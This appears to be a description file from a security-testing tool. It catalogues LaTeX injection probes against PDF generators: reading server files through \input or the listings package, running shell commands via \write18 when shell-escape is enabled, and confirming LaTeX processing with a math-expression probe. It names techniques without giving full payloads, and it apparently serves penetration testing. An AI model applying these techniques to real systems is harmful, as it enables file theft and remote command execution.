file_read.description: LaTeX injection for file read -- inject LaTeX commands in PDF generators to read server files

probes.description: LaTeX file inclusion via \input -- reads file content into generated PDF
LaTeX listings package file read -- alternative to \input using listings package

command_execution.description: LaTeX injection for command execution -- use \write18 or \immediate\write18 for shell access

probes.description: LaTeX shell escape via \write18 -- requires -shell-escape flag enabled on pdflatex. Outputs command result in PDF build log.

detection.description: LaTeX injection detection -- confirm LaTeX processing by injecting safe math expressions

probes.description: LaTeX math mode probe -- if output renders 7x7 as formatted math instead of literal text, LaTeX processing is confirmed
